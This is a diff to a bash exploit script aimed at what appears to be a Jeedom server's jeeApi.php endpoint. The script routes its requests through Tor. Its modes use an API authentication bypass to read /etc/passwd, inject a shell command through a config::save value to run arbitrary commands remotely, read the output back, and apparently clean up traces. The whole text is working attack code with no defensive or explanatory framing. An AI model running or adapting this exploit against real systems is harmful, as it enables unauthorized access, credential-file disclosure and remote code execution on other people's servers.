@@ -1,7 +1,7 @@
 
 echo "Attack on $1"
 
-if [[ $3 == "check" ]] ; then
+if [[ $2 == "check" ]] ; then
 
 echo "Checking AuthBypass And File Read /etc/passwd"
 timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d '{"jsonrpc":"2.0", "method":"log::get", "params":{"log":"/etc/passwd", "start":"", "nbLine":100, "apikey":0, "api":0,"proapi":0}}'
@@ -11,7 +11,7 @@ echo ""
 exit
 fi
 
-if [[ $3 == "read" ]] ; then
+if [[ $2 == "read" ]] ; then
 
 
 
@@ -31,7 +31,7 @@ echo ""
 exit
 fi
 
-if [[ $3 == "clean" ]] ; then
+if [[ $2 == "clean" ]] ; then
 
 echo "Cleaning..."
 
@@ -54,10 +54,11 @@ echo "All Clear..."
 exit
 fi 
 
+if [[ $2 == "exec" ]] ; then
 
-echo "Planting Payload \"$2\" And Wait 3 sec To Let It Eat The Input"
+echo "Planting Payload \"$3\" And Wait 3 sec To Let It Eat The Input"
 
-timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"config::save\", \"params\":{\"key\":\"core::branch\", \"value\":\"\$($2 >/tmp/a)\", \"apikey\":0, \"api\":0, \"proapi\":0}}"
+timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d "{\"jsonrpc\":\"2.0\", \"method\":\"config::save\", \"params\":{\"key\":\"core::branch\", \"value\":\"\$($3 >/tmp/a)\", \"apikey\":0, \"api\":0, \"proapi\":0}}"
 echo ""
 
 sleep 3
@@ -77,3 +78,7 @@ timeout 5 torify curl -skX POST $1/core/api/jeeApi.php -d '{"jsonrpc":"2.0", "me
 
 echo ""
 
+exit
+fi
+
+echo "Read The Code"
